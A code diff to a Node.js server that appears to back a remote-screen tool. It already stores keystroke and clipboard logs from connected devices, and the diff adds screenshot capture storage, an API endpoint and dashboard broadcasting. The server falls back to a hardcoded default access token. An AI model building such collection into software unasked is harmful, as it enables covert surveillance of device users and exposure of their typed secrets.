@@ -10,6 +10,7 @@ const ACCESS_TOKEN = process.env.ACCESS_TOKEN || "remote-screen-dev";
 const MAX_AUDIT = Number(process.env.MAX_AUDIT) || 200;
 const MAX_CLIPBOARD = Number(process.env.MAX_CLIPBOARD) || 300;
 const MAX_KEYBOARD = Number(process.env.MAX_KEYBOARD) || 300;
+const MAX_SCREENSHOTS = Number(process.env.MAX_SCREENSHOTS) || 80;
 
 const agents = new Map();
 const agentMeta = new Map();
@@ -18,6 +19,7 @@ const dashboardClients = new Set();
 const auditLog = [];
 const clipboardLog = new Map();
 const keyboardLog = new Map();
+const screenshotLog = new Map();
 
 const app = express();
 app.use(express.json());
@@ -98,6 +100,26 @@ function getKeyboardEntries(deviceId, limit) {
   return list.slice(0, limit);
 }
 
+function addScreenshotEntry(deviceId, msg) {
+  if (!screenshotLog.has(deviceId)) screenshotLog.set(deviceId, []);
+  const list = screenshotLog.get(deviceId);
+  const entry = {
+    id: `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
+    time: msg.time || new Date().toISOString(),
+    width: Number(msg.width) || 0,
+    height: Number(msg.height) || 0,
+    data: String(msg.data || ""),
+  };
+  list.unshift(entry);
+  if (list.length > MAX_SCREENSHOTS) list.length = MAX_SCREENSHOTS;
+  return entry;
+}
+
+function getScreenshotEntries(deviceId, limit) {
+  const list = screenshotLog.get(deviceId) || [];
+  return list.slice(0, limit);
+}
+
 function deviceSnapshot(deviceId) {
   const meta = agentMeta.get(deviceId) || {};
   const viewerCount = viewers.get(deviceId)?.size || 0;
@@ -172,6 +194,13 @@ app.get("/api/keyboard", authMiddleware, (req, res) => {
   res.json({ deviceId, entries: getKeyboardEntries(deviceId, limit) });
 });
 
+app.get("/api/screenshots", authMiddleware, (req, res) => {
+  const deviceId = req.query.deviceId;
+  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
+  const limit = Math.min(Number(req.query.limit) || MAX_SCREENSHOTS, MAX_SCREENSHOTS);
+  res.json({ deviceId, entries: getScreenshotEntries(deviceId, limit) });
+});
+
 const server = http.createServer(app);
 const wss = new WebSocketServer({ server, path: "/ws" });
 
@@ -225,6 +254,9 @@ wss.on("connection", (ws, req) => {
       device: deviceSnapshot(deviceId),
       clipboard: getClipboardEntries(deviceId, 300),
       keyboard: getKeyboardEntries(deviceId, 300),
+      screenshots: getScreenshotEntries(deviceId, MAX_SCREENSHOTS).map(
+        ({ id, time, width, height }) => ({ id, time, width, height })
+      ),
     });
     notifyAgentViewerCount(deviceId);
     addAudit("viewer_connect", { deviceId, ip: clientIp });
@@ -292,6 +324,22 @@ wss.on("connection", (ws, req) => {
           for (const viewer of set) send(viewer, payload);
         }
         broadcastDashboard("keyboard_input", payload);
+        return;
+      }
+
+      if (msg.type === "screenshot") {
+        const entry = addScreenshotEntry(deviceId, msg);
+        addAudit("screenshot", {
+          deviceId,
+          width: entry.width,
+          height: entry.height,
+        });
+        const payload = { type: "screenshot_capture", deviceId, entry };
+        const set = viewers.get(deviceId);
+        if (set) {
+          for (const viewer of set) send(viewer, payload);
+        }
+        broadcastDashboard("screenshot_capture", payload);
         return;
       }
 
